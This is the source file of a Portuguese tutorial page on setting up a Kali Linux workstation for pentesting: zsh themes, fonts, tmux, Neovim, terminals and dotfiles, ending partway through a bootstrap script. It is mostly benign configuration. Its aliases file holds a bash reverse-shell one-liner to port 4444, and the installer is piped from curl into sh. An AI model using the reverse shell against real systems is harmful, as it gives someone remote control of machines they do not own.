import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function PersonalizacaoSetup() {
  return (
    <PageContainer
      title="Personalização & Setup do Kali — sua estação de trabalho"
      subtitle="zsh + oh-my-zsh + powerlevel10k, tmux, dotfiles no git, Neovim/LazyVim, Nerd Fonts, temas XFCE, Alacritty/Kitty, Ansible para reprovisionar a máquina em minutos."
      difficulty="iniciante"
      timeToRead="28 min"
      prompt="setup/dotfiles"
    >
      <AlertBox type="danger" title="Antes de tudo: Kali NÃO é para uso diário">
        Kali é distro de <strong>segurança ofensiva</strong>: roda muita coisa
        como root, traz 600+ ferramentas de ataque, atualiza agressivo. Para
        navegar/trabalhar/jogar, use Ubuntu, Mint, Fedora ou Pop!_OS — e rode
        Kali em VM (VirtualBox/VMware/QEMU) ou WSL2. Esta página é sobre
        <strong> deixar o Kali com a sua cara para sessões de pentest</strong>,
        não para ser sistema principal.
      </AlertBox>

      <h2>Snapshot/backup antes de qualquer coisa</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "backup dos dotfiles antes de mexer em zsh/tmux/nvim",
            cmd: "mkdir -p ~/backups && tar czf ~/backups/dotfiles-$(date +%Y%m%d).tar.gz ~/.config ~/.ssh ~/.bashrc ~/.zshrc ~/.tmux.conf 2>/dev/null",
            out: `tar: removendo "/" inicial dos nomes dos arquivos
(silencioso, ~ 14MB gerados)`,
            outType: "muted",
          },
          {
            cmd: "ls -lh ~/backups/",
            out: `total 14M
-rw-r--r-- 1 wallyson wallyson 14M Apr  4 09:42 dotfiles-20260404.tar.gz`,
            outType: "info",
          },
          {
            comment: "se está em VM: snapshot é mais rápido que backup",
            cmd: "VBoxManage snapshot 'kali-2025' take 'pre-customizacao' --description 'antes de instalar zsh/tmux/nvim'",
            out: `0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
Snapshot taken. UUID: 3a7b2c1d-...`,
            outType: "success",
          },
        ]}
      />

      <h2>Descobrir seu ambiente atual</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "echo $SHELL; echo $XDG_CURRENT_DESKTOP; echo $XDG_SESSION_TYPE",
            out: `/usr/bin/zsh
XFCE
x11`,
            outType: "info",
          },
          {
            cmd: "cat /etc/os-release | grep PRETTY_NAME",
            out: `PRETTY_NAME="Kali GNU/Linux Rolling"`,
            outType: "default",
          },
          {
            cmd: "cat /etc/X11/default-display-manager",
            out: "/usr/sbin/lightdm",
            outType: "default",
          },
          {
            cmd: "neofetch --stdout | head -12",
            out: `wallyson@kali
-------------
OS: Kali GNU/Linux Rolling x86_64
Host: VirtualBox 1.2
Kernel: 6.5.0-kali3-amd64
Uptime: 2 hours, 14 mins
Packages: 3142 (dpkg), 12 (flatpak)
Shell: zsh 5.9
Resolution: 1920x1080
DE: Xfce 4.18
WM: Xfwm4
Theme: Kali-Dark [GTK2/3]
Icons: Flat-Remix-Blue-Dark [GTK2/3]`,
            outType: "info",
          },
        ]}
      />

      <h2>1. zsh + oh-my-zsh + powerlevel10k</h2>
      <p>
        O Kali já vem com zsh, mas o setup completo com{" "}
        <strong>oh-my-zsh</strong> (framework de plugins) e{" "}
        <strong>powerlevel10k</strong> (prompt rápido com ícones) deixa o
        terminal muito mais útil: git status no prompt, autocomplete colorido,
        sugestões baseadas em histórico.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "1) instalar oh-my-zsh (não-interativo)",
            cmd: 'sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended',
            out: `Cloning Oh My Zsh...
Cloning into '/home/wallyson/.oh-my-zsh'...
remote: Enumerating objects: 1421, done.
Looking for an existing zsh config...
Using the Oh My Zsh template file and adding it to /home/wallyson/.zshrc.

         __                                     __
  ____  / /_     ____ ___  __  __   ____  _____/ /_
 / __ \\/ __ \\   / __ \`__ \\/ / / /  /_  / / ___/ __ \\
/ /_/ / / / /  / / / / / / /_/ /    / /_(__  ) / / /
\\____/_/ /_/  /_/ /_/ /_/\\__, /    /___/____/_/ /_/
                        /____/                       ....is now installed!`,
            outType: "success",
          },
          {
            comment: "2) tema powerlevel10k (clone direto no custom themes)",
            cmd: "git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k",
            out: `Cloning into '/home/wallyson/.oh-my-zsh/custom/themes/powerlevel10k'...
remote: Enumerating objects: 1284, done.
Receiving objects: 100% (1284/1284), 1.42 MiB | 8.21 MiB/s, done.`,
            outType: "info",
          },
          {
            comment: "3) plugins úteis (autosuggestions + syntax highlighting)",
            cmd: "git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions",
            out: `Cloning into '/home/wallyson/.oh-my-zsh/custom/plugins/zsh-autosuggestions'...
remote: Enumerating objects: 2412, done.`,
            outType: "muted",
          },
          {
            cmd: "git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting",
            out: `Cloning into '/home/wallyson/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting'...`,
            outType: "muted",
          },
          {
            comment: "4) configurar tema + plugins no ~/.zshrc",
            cmd: "sed -i 's/^ZSH_THEME=.*/ZSH_THEME=\"powerlevel10k\\/powerlevel10k\"/' ~/.zshrc && sed -i 's/^plugins=.*/plugins=(git sudo docker kubectl zsh-autosuggestions zsh-syntax-highlighting)/' ~/.zshrc",
            out: "(silencioso — ~/.zshrc editado)",
            outType: "default",
          },
          {
            cmd: "exec zsh",
            out: `(o assistente do powerlevel10k abre na primeira execução)
This is Powerlevel10k configuration wizard. You are seeing it because you
haven't defined any Powerlevel10k configuration options.
[...]
(escolha: Unicode → 256 colors → 24-hour time → Angled → Sharp → Two lines → ...)
(salva ~/.p10k.zsh ao final)`,
            outType: "info",
          },
        ]}
      />

      <CodeBlock
        language="bash"
        title="~/.zshrc — trecho final esperado"
        code={`# Path to oh-my-zsh
export ZSH="$HOME/.oh-my-zsh"

# Tema com ícones e git status
ZSH_THEME="powerlevel10k/powerlevel10k"

# Plugins
plugins=(
  git
  sudo                       # ESC ESC = prefixar sudo
  docker
  kubectl
  zsh-autosuggestions        # sugestões cinza do histórico
  zsh-syntax-highlighting    # comandos coloridos enquanto digita
  fzf                        # Ctrl+R com fuzzy
  history-substring-search
)

source $ZSH/oh-my-zsh.sh

# Configuração do prompt p10k
[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh

# Aliases pessoais
[[ ! -f ~/.aliases ]] || source ~/.aliases`}
      />

      <AlertBox type="info" title="Reabrir o assistente do p10k">
        Se quiser refazer o estilo do prompt depois:{" "}
        <code>p10k configure</code>. Ele regenera o <code>~/.p10k.zsh</code>{" "}
        com as novas escolhas.
      </AlertBox>

      <h2>2. Nerd Fonts — caracteres bonitos no terminal</h2>
      <p>
        Powerlevel10k, starship e qualquer prompt moderno usam ícones (git
        branch ⎇, pasta 󰉋, errored ✘). Sem uma <strong>Nerd Font</strong>{" "}
        instalada, você vê quadradinhos vazios.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "FiraCode + JetBrainsMono já vêm patched no Debian/Kali",
            cmd: "sudo apt install -y fonts-firacode fonts-jetbrains-mono fonts-hack",
            out: `Reading package lists... Done
The following NEW packages will be installed:
  fonts-firacode fonts-jetbrains-mono fonts-hack
Need to get 8.421 kB of archives.
[...]
Setting up fonts-firacode (3.2-1) ...
Setting up fonts-jetbrains-mono (2.304-1) ...`,
            outType: "success",
          },
          {
            comment: "Nerd Fonts (versão patched com ícones) — baixar manual",
            cmd: 'mkdir -p ~/.local/share/fonts && cd /tmp && wget -q https://github.com/ryanoasis/nerd-fonts/releases/download/v3.2.1/FiraCode.zip && unzip -q FiraCode.zip -d ~/.local/share/fonts/FiraCodeNF',
            out: `(baixa 12MB; descompacta 14 arquivos .ttf)`,
            outType: "muted",
          },
          {
            cmd: "fc-cache -fv | tail -5",
            out: `/home/wallyson/.local/share/fonts: caching, new cache contents: 14 fonts, 0 dirs
fc-cache: succeeded`,
            outType: "info",
          },
          {
            cmd: "fc-list | grep -i 'fira code nerd'",
            out: `/home/wallyson/.local/share/fonts/FiraCodeNF/FiraCodeNerdFont-Regular.ttf: FiraCode Nerd Font:style=Regular
/home/wallyson/.local/share/fonts/FiraCodeNF/FiraCodeNerdFont-Bold.ttf: FiraCode Nerd Font:style=Bold
/home/wallyson/.local/share/fonts/FiraCodeNF/FiraCodeNerdFontMono-Regular.ttf: FiraCode Nerd Font Mono:style=Regular`,
            outType: "info",
          },
          {
            comment: "no terminal (Tilix/Alacritty/Kitty) → Preferences → Font → 'FiraCode Nerd Font Mono 12'",
            cmd: "echo '\\uf126 \\uf09b \\uf007 \\uf015'",
            out: `⎇  󰊤  󰀄  󰋜
(se aparecer ícones = funcionou. Se aparecer quadradinhos = font não foi aplicada no terminal)`,
            outType: "default",
          },
        ]}
      />

      <h2>3. Aliases úteis para pentest</h2>
      <CodeBlock
        language="bash"
        title="~/.aliases"
        code={`# ─── básicos ──────────────────────────────────────────
alias ll='ls -lah --color=auto'
alias la='ls -A'
alias ..='cd ..'
alias ...='cd ../..'
alias g='git'
alias gs='git status -sb'
alias gco='git checkout'
alias gp='git push'
alias gpl='git pull --rebase'

# ─── pentest do dia a dia ────────────────────────────
alias myip='curl -s ifconfig.io'
alias localip="ip -4 addr show | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}' | grep -v 127.0.0.1"
alias serve='python3 -m http.server 8000'
alias serve-here='python3 -m http.server 8000 --directory .'
alias listen='nc -lvnp'
alias revshell='echo "bash -c \\"bash -i >& /dev/tcp/$(myip)/4444 0>&1\\""'

# ─── nmap presets ────────────────────────────────────
alias nmap-fast='nmap -T4 -F'
alias nmap-full='sudo nmap -T4 -A -p- -sV -sC --min-rate=2000'
alias nmap-vuln='sudo nmap --script vuln'

# ─── HTB / pentest ───────────────────────────────────
alias htb-vpn='sudo openvpn ~/HTB/lab_wallyson.ovpn'
alias htb-ip="ip -4 addr show tun0 | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}'"

# ─── docker ──────────────────────────────────────────
alias dps='docker ps --format "table {{.Names}}\\t{{.Image}}\\t{{.Status}}"'
alias drm='docker rm -f $(docker ps -aq)'
alias dexec='docker exec -it'

# ─── system ──────────────────────────────────────────
alias upd='sudo apt update && sudo apt full-upgrade -y && sudo apt autoremove -y'
alias hist='history | grep'
alias ports='sudo ss -tlnp'
alias diskusage='du -sh */ 2>/dev/null | sort -hr | head -20'`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "source ~/.aliases && alias | wc -l",
            out: "47",
            outType: "info",
          },
          {
            cmd: "myip",
            out: "187.84.42.108",
            outType: "default",
          },
          {
            cmd: "localip",
            out: `192.168.50.108
10.0.2.15`,
            outType: "default",
          },
          {
            cmd: "ll ~/.config | head -8",
            out: `total 64K
drwx------ 16 wallyson wallyson 4.0K Apr  4 09:42 .
drwx------ 32 wallyson wallyson 4.0K Apr  4 09:42 ..
drwxr-xr-x  2 wallyson wallyson 4.0K Apr  4 09:42 alacritty
drwxr-xr-x  4 wallyson wallyson 4.0K Apr  4 09:42 BurpSuite
drwxr-xr-x  3 wallyson wallyson 4.0K Apr  4 09:42 nvim
drwxr-xr-x  2 wallyson wallyson 4.0K Apr  4 09:42 tmux
drwxr-xr-x  3 wallyson wallyson 4.0K Apr  4 09:42 xfce4`,
            outType: "muted",
          },
        ]}
      />

      <h2>4. tmux — multiplexador (sua sessão sobrevive a reconexão SSH)</h2>
      <p>
        Em pentest você fica horas com nmap rodando, msfconsole aberto,
        hashcat numa janela, listener noutra. Sem tmux/screen, se a SSH cai
        você perde tudo. Com tmux,{" "}
        <code>Ctrl-b d</code> desanexa e <code>tmux a</code> reanexa.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y tmux",
            out: `tmux is already the newest version (3.4-1).`,
            outType: "muted",
          },
          {
            cmd: "tmux new -s pentest",
            out: `(entra em sessão tmux. Barra status verde no fundo.)`,
            outType: "info",
          },
          {
            comment: "atalhos básicos (prefixo padrão Ctrl-b)",
            cmd: "# Ctrl-b c       nova janela\n# Ctrl-b ,       renomear janela\n# Ctrl-b %       split vertical\n# Ctrl-b \"       split horizontal\n# Ctrl-b setas   navegar entre panes\n# Ctrl-b d       desanexar (sessão continua viva!)",
            outType: "muted",
          },
          {
            cmd: "tmux ls",
            out: `pentest: 3 windows (created Thu Apr  4 09:42:11 2026) (attached)`,
            outType: "default",
          },
          {
            cmd: "tmux attach -t pentest",
            out: "(reanexa em qualquer momento — mesmo após reboot do SSH)",
            outType: "success",
          },
        ]}
      />

      <CodeBlock
        language="bash"
        title="~/.tmux.conf"
        code={`# ─── prefixo: troque Ctrl-b por Ctrl-a (mais ergonômico) ──
unbind C-b
set -g prefix C-a
bind C-a send-prefix

# ─── splits intuitivos ──────────────────────────────────
unbind '"'
unbind %
bind | split-window -h -c "#{pane_current_path}"
bind - split-window -v -c "#{pane_current_path}"

# ─── navegação vim-like ─────────────────────────────────
bind h select-pane -L
bind j select-pane -D
bind k select-pane -U
bind l select-pane -R

# ─── reload com Ctrl-a r ────────────────────────────────
bind r source-file ~/.tmux.conf \\; display "tmux.conf recarregado!"

# ─── aparência ──────────────────────────────────────────
set -g default-terminal "tmux-256color"
set -ga terminal-overrides ",xterm-256color:RGB"
set -g mouse on
set -g base-index 1
setw -g pane-base-index 1
set -g history-limit 50000

# ─── status bar bonita (sem plugin) ─────────────────────
set -g status-bg colour234
set -g status-fg colour15
set -g status-left  '#[fg=colour46,bold] #S #[default]| '
set -g status-right '#[fg=colour226]%H:%M #[fg=colour46]%d-%b-%Y'
set -g status-interval 5

# ─── tmux plugin manager (TPM) ──────────────────────────
set -g @plugin 'tmux-plugins/tpm'
set -g @plugin 'tmux-plugins/tmux-resurrect'   # salva sessão entre reboots
set -g @plugin 'tmux-plugins/tmux-continuum'   # auto-save de tempos em tempos

run '~/.tmux/plugins/tpm/tpm'`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "instalar TPM (gerenciador de plugins)",
            cmd: "git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm",
            out: `Cloning into '/home/wallyson/.tmux/plugins/tpm'...
remote: Enumerating objects: 142, done.`,
            outType: "muted",
          },
          {
            cmd: "tmux source ~/.tmux.conf",
            out: "tmux.conf recarregado!",
            outType: "success",
          },
          {
            comment: "dentro do tmux: Ctrl-a I (maiúsculo) instala todos os plugins listados",
            cmd: "# Ctrl-a + Shift-i",
            out: `Already installed "tpm"
Installing "tmux-resurrect"
Installing "tmux-continuum"

TMUX environment reloaded.

Done, press ENTER to continue.`,
            outType: "info",
          },
        ]}
      />

      <h2>5. Neovim + LazyVim — IDE moderna no terminal</h2>
      <p>
        LazyVim é uma config pronta de Neovim com LSP, autocomplete, treesitter,
        telescope, debugger — tudo configurado em uma instalação. Em pentest é
        ótimo para editar payloads, scripts Python, arquivos de config.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y neovim ripgrep fd-find git python3-pip nodejs npm",
            out: `(instala neovim 0.9.x + dependências para LSP/treesitter)
Setting up neovim (0.9.5-7) ...
Setting up ripgrep (14.1.0-1) ...`,
            outType: "muted",
          },
          {
            comment: "backup de qualquer config nvim existente",
            cmd: "mv ~/.config/nvim{,.bak} 2>/dev/null; mv ~/.local/share/nvim{,.bak} 2>/dev/null; true",
            out: "(silencioso)",
            outType: "default",
          },
          {
            cmd: "git clone https://github.com/LazyVim/starter ~/.config/nvim",
            out: `Cloning into '/home/wallyson/.config/nvim'...
remote: Enumerating objects: 1421, done.
Receiving objects: 100% (1421/1421), 187.42 KiB | 4.20 MiB/s, done.`,
            outType: "info",
          },
          {
            cmd: "rm -rf ~/.config/nvim/.git",
            out: "(remove git para você poder versionar suas customizações)",
            outType: "muted",
          },
          {
            cmd: "nvim",
            out: `(primeira execução: Lazy.nvim baixa 80+ plugins)
Installing LazyVim ...
Lazy 11.14.2 ───────────────────────
✔ LazyVim                    [+0]
✔ tokyonight.nvim            [+0]
✔ telescope.nvim             [+0]
✔ nvim-treesitter            [+0]
✔ mason.nvim                 [+0]
✔ nvim-cmp                   [+0]
[...]
Installed 84 plugins in 12.42s
Press q to close`,
            outType: "success",
          },
        ]}
      />

      <CommandTable
        title="Atalhos LazyVim essenciais"
        variations={[
          { cmd: "<space>", desc: "Leader key — abre o menu de tudo (which-key).", output: "Mostra todos os atalhos disponíveis." },
          { cmd: "<space>ff", desc: "Find files (telescope) — fuzzy do projeto.", output: "Filtre rápido qualquer arquivo." },
          { cmd: "<space>sg", desc: "Search grep — busca por conteúdo (ripgrep).", output: "Live grep em todo o repo." },
          { cmd: "<space>e", desc: "Toggle file explorer (neo-tree).", output: "Árvore de arquivos lateral." },
          { cmd: "<space>gg", desc: "Abre LazyGit (TUI git completa).", output: "Stage/commit/push sem sair do nvim." },
          { cmd: "<space>l", desc: "Menu Lazy.nvim — gerenciar plugins.", output: "Update/sync/clean/profile." },
          { cmd: "<space>cm", desc: "Menu Mason — instalar LSP/formatters/linters.", output: "Ex.: instalar pyright, ruff." },
          { cmd: "gd", desc: "Go to definition (LSP).", output: "Salta para definição da função/variável." },
          { cmd: "K", desc: "Hover docs (LSP).", output: "Documentação inline." },
          { cmd: "<space>cf", desc: "Format buffer.", output: "Roda formatter configurado (prettier/black/etc)." },
        ]}
      />

      <CodeBlock
        language="lua"
        title="~/.config/nvim/lua/plugins/pentest.lua — extensões para pentest"
        code={`return {
  -- Resaltar TODO/FIXME/HACK
  { "folke/todo-comments.nvim", opts = {} },

  -- Markdown preview no browser
  {
    "iamcco/markdown-preview.nvim",
    cmd = { "MarkdownPreviewToggle", "MarkdownPreview" },
    build = "cd app && npm install",
    ft = "markdown",
  },

  -- Hex editor para binários (msfvenom output, shellcode)
  { "RaafatTurki/hex.nvim", opts = {} },

  -- LSPs adicionais úteis em pentest
  {
    "williamboman/mason.nvim",
    opts = function(_, opts)
      vim.list_extend(opts.ensure_installed, {
        "pyright",        -- Python (scripts de exploit)
        "bash-language-server",
        "yaml-language-server",
        "ruff",           -- linter Python
      })
    end,
  },

  -- Tema Kali-like
  {
    "LazyVim/LazyVim",
    opts = { colorscheme = "tokyonight-night" },
  },
}`}
      />

      <h2>6. Terminais modernos — Alacritty, Kitty, Tilix</h2>
      <p>
        O terminal padrão do XFCE (xfce4-terminal) é OK, mas as alternativas
        modernas têm GPU rendering, ligaduras de fonte, splits nativos e
        tileing.
      </p>

      <CommandTable
        title="Terminais modernos para pentest"
        variations={[
          { cmd: "alacritty", desc: "Mais rápido (GPU, OpenGL). Config em YAML. Sem splits — combine com tmux.", output: "sudo apt install alacritty" },
          { cmd: "kitty", desc: "GPU + splits/tabs nativos + protocolo gráfico (mostra imagens).", output: "sudo apt install kitty" },
          { cmd: "tilix", desc: "GTK, splits estilo iTerm2 (Ctrl-Alt-D vertical, Ctrl-Alt-R horizontal).", output: "sudo apt install tilix" },
          { cmd: "wezterm", desc: "Como Alacritty + features de Kitty. Config em Lua.", output: "Baixar .deb do site oficial." },
          { cmd: "terminator", desc: "GTK clássico, splits + drag-and-drop.", output: "sudo apt install terminator" },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y alacritty kitty tilix",
            out: `Setting up alacritty (0.13.2-1) ...
Setting up kitty (0.32.2-1) ...
Setting up tilix (1.9.6-2) ...`,
            outType: "success",
          },
          {
            comment: "verificar atalhos de tilix (já no estilo iTerm2)",
            cmd: "# Ctrl-Alt-D     split vertical (lado a lado)\n# Ctrl-Alt-R     split horizontal (cima/baixo)\n# Ctrl-Alt-W     fechar pane\n# Alt-↑↓←→       navegar entre panes",
            outType: "muted",
          },
        ]}
      />

      <CodeBlock
        language="toml"
        title="~/.config/alacritty/alacritty.toml"
        code={`[window]
opacity = 0.92
padding = { x = 10, y = 10 }
decorations = "full"
startup_mode = "Maximized"

[font]
size = 12.0
normal = { family = "FiraCode Nerd Font Mono", style = "Regular" }
bold   = { family = "FiraCode Nerd Font Mono", style = "Bold" }
italic = { family = "FiraCode Nerd Font Mono", style = "Italic" }

[font.offset]
x = 0
y = 1

[colors.primary]
background = "#1a1b26"
foreground = "#c0caf5"

[colors.cursor]
text   = "#1a1b26"
cursor = "#7aa2f7"

# Cores estilo Tokyo Night (combina com nvim/p10k)
[colors.normal]
black   = "#15161e"
red     = "#f7768e"
green   = "#9ece6a"
yellow  = "#e0af68"
blue    = "#7aa2f7"
magenta = "#bb9af7"
cyan    = "#7dcfff"
white   = "#a9b1d2"

[shell]
program = "/usr/bin/zsh"

[keyboard]
bindings = [
  { key = "T", mods = "Control|Shift", action = "SpawnNewInstance" },
  { key = "V", mods = "Control|Shift", action = "Paste" },
  { key = "C", mods = "Control|Shift", action = "Copy" },
]`}
      />

      <CodeBlock
        language="conf"
        title="~/.config/kitty/kitty.conf"
        code={`# Font
font_family      FiraCode Nerd Font Mono
font_size        12.0
disable_ligatures never

# Cursor
cursor_shape           beam
cursor_blink_interval  0.5

# Window
background_opacity    0.94
window_padding_width  8
hide_window_decorations no

# Splits / tabs
map ctrl+shift+enter new_window_with_cwd
map ctrl+shift+t     new_tab_with_cwd
map ctrl+shift+left  previous_tab
map ctrl+shift+right next_tab
map ctrl+shift+l     next_layout

# Cores Tokyo Night
foreground #c0caf5
background #1a1b26
color0     #15161e
color1     #f7768e
color2     #9ece6a
color3     #e0af68
color4     #7aa2f7
color5     #bb9af7
color6     #7dcfff
color7     #a9b1d2`}
      />

      <h2>7. Temas XFCE — visual estilo "hacker cinematográfico"</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y arc-theme papirus-icon-theme numix-icon-theme-circle kali-themes-common",
            out: `Setting up arc-theme (20221218-1) ...
Setting up papirus-icon-theme (20240501-1) ...
Setting up kali-themes-common (2024.4.0) ...`,
            outType: "success",
          },
          {
            comment: "abrir o painel de aparência",
            cmd: "xfce4-appearance-settings &",
            out: `(GUI: Style → Kali-Dark | Icons → Flat-Remix-Blue-Dark | Fonts → Cantarell 11)`,
            outType: "muted",
          },
          {
            comment: "via CLI (sem GUI)",
            cmd: 'xfconf-query -c xsettings -p /Net/ThemeName -s "Kali-Dark"',
            out: "(silencioso — aplicado imediatamente)",
            outType: "default",
          },
          {
            cmd: 'xfconf-query -c xsettings -p /Net/IconThemeName -s "Flat-Remix-Blue-Dark"',
            out: "(silencioso)",
            outType: "default",
          },
          {
            cmd: "sudo apt install -y kali-wallpapers-2024 kali-wallpapers-legacy",
            out: `Setting up kali-wallpapers-2024 (2024.4.0) ...
The following wallpapers are now available in:
  /usr/share/backgrounds/kali/`,
            outType: "info",
          },
          {
            cmd: "ls /usr/share/backgrounds/kali/ | head",
            out: `kali-blue-pixels.png
kali-dragon.png
kali-honeycomb.png
kali-neon-grid.png
kali-purple-storm.png
kali-redteam-skull.png
kali-rsplain.png
kali-tech-circuit.png`,
            outType: "muted",
          },
          {
            comment: "definir wallpaper via xfconf",
            cmd: "xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s /usr/share/backgrounds/kali/kali-neon-grid.png",
            out: "(wallpaper trocado)",
            outType: "success",
          },
        ]}
      />

      <h2>8. Dotfiles versionados no Git (bare repo trick)</h2>
      <p>
        O segredo para reprovisionar sua máquina em minutos:{" "}
        <strong>tudo</strong> que você customizou (zshrc, tmux.conf, p10k.zsh,
        config nvim, alacritty, kitty, aliases) num único repo git, com truque
        do <strong>bare repo</strong> que evita ter um <code>.git</code> na
        sua HOME inteira.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "1) cria bare repo só para tracking de dotfiles",
            cmd: "git init --bare $HOME/.dotfiles",
            out: `Initialized empty Git repository in /home/wallyson/.dotfiles/`,
            outType: "info",
          },
          {
            comment: "2) cria função (alias) que substitui 'git' para esse repo",
            cmd: 'echo "alias dot=\'/usr/bin/git --git-dir=$HOME/.dotfiles/ --work-tree=$HOME\'" >> ~/.zshrc && source ~/.zshrc',
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "3) configurar para não mostrar arquivos não-trackeados",
            cmd: "dot config --local status.showUntrackedFiles no",
            out: "(silencioso)",
            outType: "default",
          },
          {
            comment: "4) adicionar arquivos importantes",
            cmd: "dot add ~/.zshrc ~/.aliases ~/.tmux.conf ~/.p10k.zsh ~/.config/alacritty/alacritty.toml ~/.config/kitty/kitty.conf ~/.config/nvim",
            out: "(silencioso — arquivos staged)",
            outType: "default",
          },
          {
            cmd: "dot status",
            out: `On branch main

No commits yet

Changes to be committed:
  (use "git rm --cached <file>..." to unstage)
        new file:   .aliases
        new file:   .config/alacritty/alacritty.toml
        new file:   .config/kitty/kitty.conf
        new file:   .config/nvim/init.lua
        new file:   .config/nvim/lua/plugins/pentest.lua
        new file:   .p10k.zsh
        new file:   .tmux.conf
        new file:   .zshrc`,
            outType: "info",
          },
          {
            cmd: 'dot commit -m "feat: setup inicial do kali"',
            out: `[main (root-commit) a1b2c3d] feat: setup inicial do kali
 8 files changed, 412 insertions(+)`,
            outType: "success",
          },
          {
            cmd: "dot remote add origin git@github.com:wallyson/kali-dotfiles.git && dot push -u origin main",
            out: `Enumerating objects: 14, done.
Counting objects: 100% (14/14), done.
Delta compression using up to 8 threads
Compressing objects: 100% (12/12), done.
Writing objects: 100% (14/14), 14.21 KiB | 4.74 MiB/s, done.
To github.com:wallyson/kali-dotfiles.git
 * [new branch]      main -> main`,
            outType: "warning",
          },
        ]}
      />

      <AlertBox type="info" title="Restaurar em máquina nova">
        Em outra máquina Kali fresca:{" "}
        <code>git clone --bare git@github.com:wallyson/kali-dotfiles.git $HOME/.dotfiles</code>
        {" "}+{" "}
        <code>alias dot='git --git-dir=$HOME/.dotfiles/ --work-tree=$HOME'</code>
        {" "}+{" "}
        <code>dot checkout</code>. Em 30 segundos você tem TODA a sua
        customização de volta.
      </AlertBox>

      <h2>9. Script de bootstrap pós-install (idempotente)</h2>
      <CodeBlock
        language="bash"
        title="bootstrap.sh — rodar logo após instalar Kali fresco"
        code={`#!/usr/bin/env bash
# bootstrap.sh — provisiona Kali do jeito que eu gosto.
# Idempotente: rodar 2x não quebra nada.
set -euo pipefail

USER_HOME="$HOME"
DOTFILES_REPO="git@github.com:wallyson/kali-dotfiles.git"

log() { echo -e "\\033[1;34m[+]\\033[0m $*"; }
warn(){ echo -e "\\033[1;33m[!]\\033[0m $*"; }
err() { echo -e "\\033[1;31m[-]\\033[0m $*" >&2; }

# ─── 1) update completo ─────────────────────────────────
log "Atualizando sistema..."
sudo apt update
sudo apt full-upgrade -y
sudo apt autoremove -y

# ─── 2) pacotes base ────────────────────────────────────
log "Instalando pacotes base..."
sudo apt install -y \\
  zsh tmux neovim git curl wget unzip \\
  ripgrep fd-find fzf jq htop tree neofetch \\
  fonts-firacode fonts-jetbrains-mono \\
  alacritty tilix \\
  python3-pip python3-venv pipx \\
  build-essential

# ─── 3) ferramentas extras de pentest ───────────────────
log "Instalando ferramentas de pentest..."
sudo apt install -y \\
  netexec impacket-scripts bloodhound.py \\
  gobuster ffuf seclists \\
  proxychains4 tor torbrowser-launcher

# ─── 4) Nerd Font ───────────────────────────────────────
if [ ! -d "$USER_HOME/.local/share/fonts/FiraCodeNF" ]; then
  log "Instalando FiraCode Nerd Font..."
  mkdir -p "$USER_HOME/.local/share/fonts/FiraCodeNF"
  cd /tmp
  wget -q https://github.com/ryanoasis/nerd-fonts/releases/download/v3.2.1/FiraCode.zip
  unzip -qo FiraCode.zip -d "$USER_HOME/.local/share/fonts/FiraCodeNF"
  fc-cache -f
else
  warn "Nerd Font já instalada, pulando."
fi

# ─── 5) oh-my-zsh ──────────────────────────────────────
if [ ! -d "$USER_HOME/.oh-my-zsh" ]; then
  log "Instalando oh-my-zsh..."
  sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended --keep-zshrc
else
  warn "oh-my-zsh já instalado, pulando."
fi

ZSH_CUSTOM="$USER_HOME/.oh-my-zsh/custom"

# powerlevel10k
[ ! -d "$ZSH_CUSTOM/themes/powerlevel10k" ] && \\
  git clone --depth=1 https://github.com/romkatv/powerlevel10k.git "$ZSH_CUSTOM/themes/powerlevel10k"

# plugins
[ ! -d "$ZSH_CUSTOM/plugins/zsh-autosuggestions" ] && \\
  git clone https://github.com/zsh-users/zsh-autosuggestions "$ZSH_CUSTOM/plugins/zsh-autosuggestions"
[ ! -d "$ZSH_CUSTOM/plugins/zsh-syntax-highlighting" ] && \\
  git clone https://github.com/zsh-users/zsh-syntax-highlighting "$ZSH_CUSTOM/plugins/zsh-syntax-highlighting"

# ─── 6) tmux TPM ───────────────────────────────────────
[ ! -d "$USER_HOME/.tmux/plugins/tpm" ] && \\
  git clone https://github.com/tmux-plugins/tpm "$USER_HOME/.tmux/plugins/tpm"

# ─── 7) LazyVim (se não houver config nvim) ────────────
if [ ! -d "$USER_HOME/.config/nvim" ]; then
  log "Instalando LazyVim..."
  git clone https://github.com/LazyVim/starter "$USER_HOME/.config/nvim"
  rm -rf "$USER_HOME/.config/nvim/.git"
fi

# ─── 8) dotfiles via bare repo ─────────────────────────
if [ ! -d "$USER_HOME/.dotfiles" ]; then
